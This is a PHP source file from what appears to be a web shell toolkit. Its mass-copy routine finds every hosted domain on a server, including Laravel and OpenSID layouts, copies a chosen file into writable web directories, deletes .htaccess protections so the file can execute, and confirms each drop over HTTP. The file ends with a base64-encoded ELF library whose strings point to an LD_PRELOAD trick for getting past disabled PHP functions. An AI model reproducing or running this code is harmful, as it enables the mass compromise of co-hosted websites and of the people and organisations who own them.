    if ($dir === '' || !@is_dir($dir)) {
        return false;
    }
    if (!@is_dir($dir . '/desa')) {
        return false;
    }
    if (@is_file($dir . '/catatan_rilis.md')) {
        return true;
    }
    $markers = array('rfm', 'pbb', 'donjo-app', 'storage');
    foreach ($markers as $m) {
        if (@is_dir($dir . '/' . $m)) {
            return true;
        }
    }
    return false;
}


function geckoMassOpenSidDesaDir($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    if ($dir === '') {
        return '';
    }
    if (basename($dir) === 'desa') {
        $parent = dirname($dir);
        if (geckoMassIsOpenSidApp($parent)) {
            return $dir;
        }
    }
    if (geckoMassIsOpenSidApp($dir)) {
        return $dir . '/desa';
    }
    $parent = dirname($dir);
    if ($parent !== $dir && geckoMassIsOpenSidApp($parent)) {
        return $parent . '/desa';
    }
    return '';
}


function geckoMassFilterUnderRoot($paths, $root)
{
    $root = rtrim(str_replace('\\', '/', (string)$root), '/');
    if ($root === '' || !is_array($paths)) {
        return array();
    }
    $out = array();
    $rootSlash = $root . '/';
    foreach ($paths as $p) {
        $p = rtrim(str_replace('\\', '/', (string)$p), '/');
        if ($p === $root || strpos($p, $rootSlash) === 0) {
            $out[] = $p;
        }
    }
    return $out;
}


function geckoMassFindWritableScoped($rootDir, $limit = 12)
{
    $rootDir = rtrim(str_replace('\\', '/', (string)$rootDir), '/');
    $limit = max(1, (int)$limit);
    if ($rootDir === '' || !@is_dir($rootDir)) {
        return array();
    }

    $deep = geckoMassFindWritableDirs($rootDir, $limit, 1, 14);
    $deep = geckoMassFilterUnderRoot($deep, $rootDir);
    if (!empty($deep)) {
        return $deep;
    }

    $shallow = geckoMassFindWritableDirs($rootDir, $limit, 0, 6);
    $shallow = geckoMassFilterUnderRoot($shallow, $rootDir);
    if (!empty($shallow)) {
        return $shallow;
    }

    if (@is_writable($rootDir)) {
        return array($rootDir);
    }
    return array();
}


function geckoMassFindWritableInLaravelPublic($publicDir, $limit = 12)
{
    return geckoMassFindWritableScoped($publicDir, $limit);
}


function geckoMassGetWebRoot($domainDir)
{
    $domainDir = rtrim(str_replace('\\', '/', $domainDir), '/');
    $laravelPublic = geckoMassLaravelPublicDir($domainDir);
    if ($laravelPublic !== '') {
        return $laravelPublic;
    }
    $desaDir = geckoMassOpenSidDesaDir($domainDir);
    if ($desaDir !== '') {
        return $desaDir;
    }
    foreach (geckoMassWebRoots() as $wr) {
        $p = $domainDir . '/' . $wr;
        if (@is_dir($p)) return $p;
    }
    return $domainDir;
}


function geckoMassResolveCopyWebRoot($domainDir, $mode = 'v1')
{
    $domainDir = rtrim(str_replace('\\', '/', (string)$domainDir), '/');
    $laravelPublic = geckoMassLaravelPublicDir($domainDir);
    if ($laravelPublic !== '') {
        return $laravelPublic;
    }
    $desaDir = geckoMassOpenSidDesaDir($domainDir);
    if ($desaDir !== '') {
        return $desaDir;
    }
    if ($mode === 'v1') {
        return geckoMassGetWebRoot($domainDir);
    }
    return $domainDir;
}


function geckoMassBuildUrl($scheme, $domainName, $domainDir, $dest)
{
    $domainDir = rtrim(str_replace('\\', '/', $domainDir), '/');
    $dest = str_replace('\\', '/', $dest);
    foreach (geckoMassWebRoots() as $wr) {
        $prefix = $domainDir . '/' . $wr . '/';
        if (strpos($dest, $prefix) === 0) {
            return $scheme . '://' . $domainName . '/' . substr($dest, strlen($prefix));
        }
    }
    if ($domainDir !== '' && strpos($dest, $domainDir . '/') === 0) {
        $rel = ltrim(substr($dest, strlen($domainDir)), '/');
        return $scheme . '://' . $domainName . '/' . $rel;
    }
    if (preg_match('#^(.*?)/public(/.*)$#', $dest, $m) && geckoMassIsLaravelApp($m[1])) {
        return $scheme . '://' . $domainName . $m[2];
    }
    if (preg_match('#^(.*?)/desa(/.*)$#', $dest, $m) && geckoMassIsOpenSidApp($m[1])) {
        return $scheme . '://' . $domainName . '/desa' . $m[2];
    }
    $rel = ltrim(substr($dest, strlen($domainDir)), '/');
    return $scheme . '://' . $domainName . '/' . $rel;
}


function geckoMassIsPhpBlocking($content)
{
    $content = (string)$content;
    if (preg_match('/php_flag\s+engine\s+off/i', $content)) return true;
    if (preg_match('/php_admin_flag\s+engine\s+off/i', $content)) return true;
    if (preg_match('/RemoveHandler\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/RemoveType\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/AddType\s+application\/octet-stream\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/AddType\s+application\/x-httpd-txt\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/<FilesMatch[^>]*\.php[^>]*>.*?Deny\s+from\s+all.*?<\/FilesMatch>/is', $content)) return true;
    return false;
}


function geckoMassRemoveDirHtaccess($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    if ($dir === '') {
        return 'missing';
    }
    $ht = $dir . '/.htaccess';
    if (!@file_exists($ht)) {
        return 'none';
    }
    if (@unlink($ht)) {
        return 'deleted';
    }
    
    if (@is_writable($ht) && @file_put_contents($ht, '') !== false) {
        @unlink($ht);
        if (!@file_exists($ht)) {
            return 'deleted';
        }
        return 'cleared';
    }
    return 'failed';
}


function geckoMassRemovePathHtaccessChain($fromRoot, $targetDir)
{
    $fromRoot = rtrim(str_replace('\\', '/', (string)$fromRoot), '/');
    $targetDir = rtrim(str_replace('\\', '/', (string)$targetDir), '/');
    if ($fromRoot === '' || $targetDir === '') {
        return 'missing';
    }

    $dirs = array();
    if ($targetDir === $fromRoot || strpos($targetDir . '/', $fromRoot . '/') === 0) {
        $rel = trim(substr($targetDir, strlen($fromRoot)), '/');
        $current = $fromRoot;
        $dirs[] = $current;
        if ($rel !== '') {
            foreach (explode('/', $rel) as $part) {
                if ($part === '' || $part === '.' || $part === '..') {
                    continue;
                }
                $current .= '/' . $part;
                $dirs[] = $current;
            }
        }
    } else {
        $dirs[] = $targetDir;
    }

    $deleted = 0;
    $cleared = 0;
    $failed = 0;
    $none = 0;
    $details = array();
    foreach ($dirs as $dir) {
        $st = geckoMassRemoveDirHtaccess($dir);
        if ($st === 'deleted') {
            $deleted++;
            $details[] = 'deleted@' . $dir;
        } elseif ($st === 'cleared') {
            $cleared++;
            $details[] = 'cleared@' . $dir;
        } elseif ($st === 'failed') {
            $failed++;
            $details[] = 'failed@' . $dir;
        } else {
            $none++;
        }
    }

    $summary = 'chain dirs=' . count($dirs)
        . ' deleted=' . $deleted
        . ' cleared=' . $cleared
        . ' failed=' . $failed
        . ' none=' . $none;
    if (!empty($details)) {
        $summary .= ' [' . implode('; ', $details) . ']';
    }
    return $summary;
}


function geckoMassClearPathHtaccess($domainDir, $targetDir)
{
    geckoMassRemovePathHtaccessChain($domainDir, $targetDir);
    return true;
}


function geckoMassWriteAllowHtaccess($dir, $filename)
{
    $ht = rtrim(str_replace('\\', '/', $dir), '/') . '/.htaccess';
    $allow = "<FilesMatch '^(" . preg_quote($filename, '/') . ")$'>\n"
        . "Order allow,deny\n"
        . "Allow from all\n"
        . "</FilesMatch>\n"
        . "<FilesMatch \"^\\.\">\n"
        . "  Order allow,deny\n"
        . "  Deny from all\n"
        . "</FilesMatch>\n";
    if (file_exists($ht)) {
        $existing = @file_get_contents($ht);
        if ($existing !== false && !geckoMassIsPhpBlocking($existing)) {
            @file_put_contents($ht, $existing . "\n" . $allow);
            return;
        }
    }
    @file_put_contents($ht, $allow);
}


function geckoMassHttpStatus($url, $timeout = 3)
{
    $timeout = max(1, min(10, (int)$timeout));
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        @curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $code;
    }
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'HEAD',
            'timeout' => $timeout,
            'ignore_errors' => true,
            'follow_location' => 1,
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
        ),
    ));
    $h = @get_headers($url, 0, $ctx);
    if (!$h || !isset($h[0])) return 0;
    if (preg_match('/\s(\d{3})\s/', $h[0], $m)) {
        return (int)$m[1];
    }
    return 0;
}


function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 0, $offset = 0, $v3 = false, $mode = '')
{
    @ignore_user_abort(true);
    @set_time_limit(($limit < 1) ? 0 : 90);
    @ini_set('max_execution_time', ($limit < 1) ? '0' : '90');
    @ini_set('memory_limit', '256M');

    $src = trim(str_replace('\\', '/', (string)$src));
    $base = trim(str_replace('\\', '/', (string)$base));
    $debug = (bool)$debug;
    
    $mode = geckoMassPickMode($v2, $v3, $mode);
    $v2 = ($mode === 'v2');
    $v3 = ($mode === 'v3');
    $limit = (int)$limit;
    $offset = (int)$offset;
    
    if ($offset < 0) $offset = 0;

    $debugLog = array();
    $log = function ($msg) use ($debug, &$debugLog) {
        if ($debug) {
            $debugLog[] = (string)$msg;
        }
    };
    $started = microtime(true);
    $budgetSec = ($limit < 1) ? 600 : (($mode === 'v1') ? 80 : 55);

    if ($src === '') {
        return array('ok' => false, 'error' => 'Source file wajib diisi.');
    }
    if ($mode === 'v3') {
        $base = '@vhost';
    } elseif ($mode === 'v2') {
        $base = '@system';
    } elseif ($base === '') {
        return array('ok' => false, 'error' => 'Base path wajib diisi (atau aktifkan Mass Copy v2/v3).');
    }
    if (strpos($src, "\0") !== false || strpos($base, "\0") !== false) {
        return array('ok' => false, 'error' => 'Path mengandung karakter ilegal.');
    }
    if (!file_exists($src) || !is_file($src)) {
        return array('ok' => false, 'error' => 'File sumber tidak ditemukan: ' . $src);
    }
    if (!is_readable($src)) {
        return array('ok' => false, 'error' => 'File sumber tidak readable: ' . $src);
    }

    $filename = basename($src);
    $resolved = geckoMassResolveTargets($base, $v2, $v3, $mode);
    $log('Mode: ' . $mode . ' / resolve=' . (isset($resolved['mode']) ? $resolved['mode'] : '?') . ' / method: ' . (isset($resolved['method']) ? $resolved['method'] : '?'));
    if (empty($resolved['ok']) || empty($resolved['targets'])) {
        return array(
            'ok' => false,
            'error' => !empty($resolved['error']) ? $resolved['error'] : 'Tidak ada domain/user target.',
            'mode' => $mode,
            'v2' => $v2,
            'v3' => $v3,
            'debug_log' => $debug ? $debugLog : array(),
            'resolve' => $resolved,
        );
    }

    $allTargets = $resolved['targets'];
    $totalTargets = count($allTargets);
    $discoveredDomains = isset($resolved['discovered_domains']) ? (int)$resolved['discovered_domains'] : $totalTargets;
    $uniqueDocroots = isset($resolved['unique_docroots']) ? (int)$resolved['unique_docroots'] : $totalTargets;
    if ($limit < 1) {
        $targets = array_slice($allTargets, $offset);
    } else {
        $targets = array_slice($allTargets, $offset, $limit);
    }
    $domainCount = count($targets);
    $log('Discovered domains=' . $discoveredDomains . ' unique docroots=' . $uniqueDocroots);
    $log('Targets total=' . $totalTargets . ' batch offset=' . $offset . ' limit=' . ($limit < 1 ? 'ALL' : $limit) . ' size=' . $domainCount);

    $results = array();
    $skipped = 0;
    $processed = 0;
    $timedOut = false;

    foreach ($targets as $target) {
        if ((microtime(true) - $started) >= $budgetSec) {
            $timedOut = true;
            $log('STOP: time budget ' . $budgetSec . 's');
            break;
        }

        $domainDir = isset($target['domainDir']) ? $target['domainDir'] : '';
        $domainName = isset($target['domain']) ? $target['domain'] : '';
        $domainUser = isset($target['user']) ? $target['user'] : '';
        $altDomains = (isset($target['domains']) && is_array($target['domains'])) ? $target['domains'] : array($domainName);
        $log('--- user=' . $domainUser . ' domain=' . $domainName . ' ---');
        $log('  domainDir: ' . $domainDir);
        $processed++;

        if ($domainDir === '' || !@is_dir($domainDir)) {
            $log('  SKIP: public_html missing');
            $skipped++;
            continue;
        }

        
        if ($mode !== 'v2') {
            $isLocal = (substr($domainName, -6) === '.local');
            if (!$isLocal) {
                $code = geckoMassHttpStatus('https://' . $domainName . '/', 2);
                if ($code < 200 || $code >= 500) {
                    $code = geckoMassHttpStatus('http://' . $domainName . '/', 2);
                    if ($code < 200 || $code >= 500) {
                        $log('  SKIP: domain not reachable');
                        $skipped++;
                        continue;
                    }
                }
            }
        }

        $laravelPublic = geckoMassLaravelPublicDir($domainDir);
        $desaDir = geckoMassOpenSidDesaDir($domainDir);
        $scopedRoot = '';
        $scopedLabel = '';
        $isScoped = false;

        if ($laravelPublic !== '') {
            $scopedRoot = $laravelPublic;
            $scopedLabel = 'public';
            $isScoped = true;
            $webRoot = $laravelPublic;
            $urlRoot = $laravelPublic;
            $log('  Laravel detected -> target ONLY public/ (ignore storage/app/vendor/...): ' . $webRoot);
        } elseif ($desaDir !== '') {
            $scopedRoot = $desaDir;
            $scopedLabel = 'desa';
            $isScoped = true;
            $webRoot = $desaDir;
            $urlRoot = rtrim(str_replace('\\', '/', dirname($desaDir)), '/');
            $log('  OpenSID detected -> target ONLY desa/ (ignore rfm/pbb/donjo-app/storage/...): ' . $webRoot);
        } else {
            $webRoot = geckoMassResolveCopyWebRoot($domainDir, $mode);
            $urlRoot = $webRoot;
        }
        $log('  webRoot: ' . $webRoot);
        $candidates = array();

        if ($isScoped) {
            $candidates = geckoMassFindWritableScoped($webRoot, ($mode === 'v2') ? 6 : 12);
            foreach ($candidates as $c) {
                $log('    ' . $scopedLabel . ' cand: ' . $c);
            }
            $candidates = geckoMassFilterUnderRoot($candidates, $webRoot);
        } elseif ($mode === 'v2') {
            
            if (@is_writable($webRoot)) {
                $candidates[] = $webRoot;
            }
            if (count($candidates) < 3) {
                $more = geckoMassFindWritableDirs($webRoot, 3, 0, 6);
                foreach ($more as $c) {
                    if (!in_array($c, $candidates, true)) {
                        $candidates[] = $c;
                    }
                    if (count($candidates) >= 3) break;
                }
            }
        } else {
            
            $candidates = geckoMassFindWritableDirs($webRoot, 12, 2, 14);
            foreach ($candidates as $c) {
                $log('    cand depthish: ' . $c);
            }
            if (empty($candidates)) {
                $log('  no deep writable; fallback shallow');
                $candidates = geckoMassFindWritableDirs($webRoot, 6, 0, 4);
            }
        }
        $log('  writable: ' . count($candidates));
        if (empty($candidates)) {
            $log('  SKIP: no writable' . ($isScoped ? (' under ' . $scopedLabel . '/') : ''));
            $skipped++;
            continue;
        }

        $copied = false;
        foreach ($candidates as $targetDir) {
            if ($isScoped) {
                $td = rtrim(str_replace('\\', '/', (string)$targetDir), '/');
                $pr = rtrim($webRoot, '/');
                if ($td !== $pr && strpos($td, $pr . '/') !== 0) {
                    $log('    SKIP outside ' . $scopedLabel . '/: ' . $targetDir);
                    continue;
                }
            }
            
            $dest = rtrim($targetDir, '/') . '/' . $filename;
            $method = geckoMassSmartCopy($src, $dest);
            if (!$method) {
                $log('    SKIP: copy failed');
                continue;
            }
            $log('    copied: ' . $dest . ' [' . $method . ']');

            $htStatus = geckoMassRemovePathHtaccessChain($webRoot, $targetDir);
            $log('    htaccess: ' . $htStatus);

            $pathOk = (is_file($dest) && @filesize($dest) > 0);
            $url = '';
            $urlOk = false;
            $urlStatus = 0;
            $log('    check path: ' . ($pathOk ? 'OK' : 'FAIL') . ' size=' . (@filesize($dest) ? filesize($dest) : 0));

            
            
            $domainsTry = (isset($target['domains']) && is_array($target['domains'])) ? $target['domains'] : array();
            if (!in_array($domainName, $domainsTry, true) && $domainName !== '') {
                array_unshift($domainsTry, $domainName);
            }
            foreach ($altDomains as $ad) {
                if ($ad !== '' && !in_array($ad, $domainsTry, true)) {
                    $domainsTry[] = $ad;
                }
            }

            $picked = '';
            foreach ($domainsTry as $dTry) {
                if ($dTry === '' || substr($dTry, -6) === '.local') continue;
                $uHttps = geckoMassBuildUrl('https', $dTry, $urlRoot, $dest);
                $st = geckoMassHttpStatus($uHttps, 2);
                $log('    check url https: ' . $uHttps . ' => ' . $st);
                if ($st === 200) {
                    $url = $uHttps;
                    $urlOk = true;
                    $urlStatus = 200;
                    $picked = $dTry;
                    break;
                }
                $uHttp = geckoMassBuildUrl('http', $dTry, $urlRoot, $dest);
                $st2 = geckoMassHttpStatus($uHttp, 2);
                $log('    check url http: ' . $uHttp . ' => ' . $st2);
                if ($st2 === 200) {
                    $url = $uHttp;
                    $urlOk = true;
                    $urlStatus = 200;
                    $picked = $dTry;
                    break;
                }
                
                if ($url === '') {
                    $url = $uHttps;
                    $urlStatus = (int)$st;
                    $picked = $dTry;
                }
            }
            if ($picked !== '') {
                $domainName = $picked;
            }
            if ($url === '') {
                $url = $dest;
                $log('    check url: skipped (.local / no FQDN)');
            }

            $verified = $pathOk;
            if (!$verified) {
                $log('    SKIP: path invalid after copy');
                $skipped++;
                continue;
            }

            $results[] = array(
                'url' => $url,
                'dest' => $dest,
                'domain' => $domainName,
                'user' => $domainUser,
                'path' => $dest,
                'method' => $method,
                'path_ok' => $pathOk,
                'url_ok' => $urlOk,
                'url_status' => (int)$urlStatus,
                'htaccess' => $htStatus,
                'verified' => ($urlOk ? 'http' : ($pathOk ? 'file' : 'no')),
            );
            $copied = true;
            $log('    OK: path=' . ($pathOk ? 'valid' : 'invalid')
                . ' url=' . ($urlOk ? ('valid(' . $urlStatus . ')') : ('invalid(' . $urlStatus . ')'))
                . ' htaccess=' . $htStatus
                . ' => ' . $url);
            break;
        }
        if (!$copied) {
            $skipped++;
        }
    }

    $successUrls = array();
    foreach ($results as $r) {
        $successUrls[] = $r['url'];
    }

    if ($timedOut) {
        $nextOffset = $offset + $processed;
        $hasMore = $nextOffset < $totalTargets;
    } else {
        $nextOffset = $offset + $domainCount;
        $hasMore = $nextOffset < $totalTargets;
    }

    $modeLabel = ($mode === 'v3') ? 'Mass Copy v3' : (($mode === 'v2') ? 'Mass Copy v2' : 'Mass Copy');
    return array(
        'ok' => true,
        'source' => $src,
        'base' => $base,
        'mode' => $mode,
        'v2' => $v2,
        'v3' => $v3,
        'filename' => $filename,
        'resolve_mode' => isset($resolved['mode']) ? $resolved['mode'] : '',
        'resolve_method' => isset($resolved['method']) ? $resolved['method'] : '',
        'domain_count' => $totalTargets,
        'discovered_domains' => $discoveredDomains,
        'unique_docroots' => $uniqueDocroots,
        'batch_count' => $domainCount,
        'batch_offset' => $offset,
        'batch_limit' => ($limit < 1) ? 0 : $limit,
        'processed' => $processed,
        'next_offset' => $nextOffset,
        'has_more' => $hasMore,
        'partial' => $hasMore || $timedOut,
        'timed_out' => $timedOut,
        'confirmed' => count($successUrls),
        'skipped' => $skipped,
        'urls' => $successUrls,
        'details' => $results,
        'debug_log' => $debug ? $debugLog : array(),
        'elapsed' => round(microtime(true) - $started, 2),
        'message' => $modeLabel
            . ' · batch ' . $processed . '/' . $totalTargets
            . ' · confirmed ' . count($successUrls)
            . ($hasMore ? ' · lanjut offset=' . $nextOffset : ' · selesai')
            . ' · via ' . (isset($resolved['method']) ? $resolved['method'] : 'folder'),
    );
}


function geckoBypassPayload64()
{
    return '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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAA